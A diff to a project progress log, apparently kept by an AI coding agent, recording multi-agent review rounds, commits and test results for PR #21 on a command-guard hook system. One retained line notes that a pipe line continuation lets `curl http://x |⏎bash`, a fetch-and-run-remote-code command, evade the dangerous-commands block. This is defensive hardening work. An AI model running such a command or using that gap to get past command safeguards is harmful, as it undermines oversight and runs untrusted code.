@@ -4,7 +4,7 @@ review-cycle: 30d
 retention: archive-after-6m
 staleness-threshold: 90d
 tags: [work/completed, work/in-progress, work/backlog]
-last-reviewed: 2026-08-23
+last-reviewed: 2026-08-26
 compaction_generation: 0
 source_type: canonical
 confidence: high
@@ -282,13 +282,13 @@ implementation, uncommitted as of this entry; committed 2026-08-21 as `4bc107c`.
   its 60 KB byte cap — so `[NS-28]`'s retire-the-line-cap idea needs its own pass; it would remove the
   sole active constraint, not a redundant one.
 
+## 2026-08-26 — PR #21: round-10 gate pass, Approve + 4 must-fixes
+
+- Six-agent gate → **Approve + 4 must-fixes, all applied.** Check 5's matcher showed a **false OK** (the row this branch hand-fixed yields no claim) *and* **false WARN** (`th(at) 50%`); `\b` closed the WARN, the OK gap is a recorded KNOWN LIMIT. `-cnotcontains` closes a **third** sh/ps1 case divergence. Suites 39/47/19/9. Detail: `docs/MEMORY-BANK-PARADIGM-REVIEW.md` § Round 10.
+
 ## 2026-08-25 — Round 9 Completed (all six domains); Separator Hole Closed; Figures Corrected Outward
 
-**The session crossed local midnight — `[NS-34]` exactly as documented.** The contract expired
-2026-08-25T00:00:53Z and was re-proposed with byte-identical scope after verifying the tree was
-untouched overnight. This is a NEW dated section on purpose: appending 08-25 work under the 08-24
-heading is the `493dfa5` error class, and round 9's own Maintainability pass caught the first attempt
-at it.
+**Session crossed local midnight — `[NS-34]` exactly as documented; contract re-proposed with byte-identical scope. New dated section on purpose: appending to yesterday's heading is the `493dfa5` error class.**
 
 - ✅ **All six domains ran, plus Opposition** — the first complete review on this branch in nine
   rounds. Maintainability: 0 blocking, 15 documentation findings. Architecture Drift: 1 blocking.
@@ -332,9 +332,11 @@ at it.
   `|` is a real line continuation, so `curl http://x |⏎bash` evades BLOCK entirely. Both are on `main`
   today and are more severe than anything this branch introduced. **Absorbing findings like these is
   what kept this branch from converging for nine rounds.**
-- **Verified at completion:** full bash suite 448/19 suites/0 failures · `dangerous-commands` 124/0 in
-  C, C.UTF-8 and en_US.UTF-8 · Pester 58/0 · PSScriptAnalyzer 0/23 · 7 mirror pairs identical ·
-  HOOKS-GUIDE trim 321/289 · scope 32/32.
+- ✅ **APPROVED and COMMITTED as `08cb444`** (32 files, 3575+/156-, an exact set match to contract scope). First Approve in nine rounds; Opposition wrote the marker and the commit gate consumed it. It downgraded **both** Correctness blockers on measured counter-evidence — a 16-case matrix showed both **sh-only**, ps1 catches them, verdicts identical to `main` — and disproved one of its own findings. **PR #21 opened; NOT merged as of 2026-08-25.**
+- 📌 **Opposition's sharpest finding is not a bug and is OPEN:** the `.*` widening expands the false-positive surface while this file's own notes reject gating truthy spellings as training the operator to dismiss the prompt. Three of its probes were denied mid-review; two more in the follow-up session (`[NS-25]` 20-21). Severity calibration also called inverted.
+- 📌 **A verification claim of mine was incomplete:** "all 7 mirror pairs byte-identical" — more are in scope, and `standards/MEMORY-BANK.md` diverges inverted (LIVE says `mb compact`, which `mb.sh` exits 2 on). Pre-existing `[NS-33]`(c).
+- ✅ **Follow-up: five sh/ps1 fixes** — `.gitignore` reconciliation now runs on `upgrade`; check 5 compares VALUES; three stale 50% constants (incl. the shipped mirror) defer by name. **Live bug in my own helper:** `grep -qxF` misses every entry on a CRLF file under real GNU grep, so `upgrade` from Linux re-appended all 11 entries every run. Fixed + mutation-tested. Committed 2026-08-26.
+- **Verified at completion:** bash 448/19 suites/0 · `dangerous-commands` 124/0 in C, C.UTF-8, en_US.UTF-8 · Pester 58/0 · PSScriptAnalyzer 0/23 · trim 321/289 · scope 32/32.
 
 ## 2026-08-24 (rounds 8-9) — Round 8's Fixes Rejected by Round 8; Round 9 Then Found the Gap Class Was Itself a Bypass
 
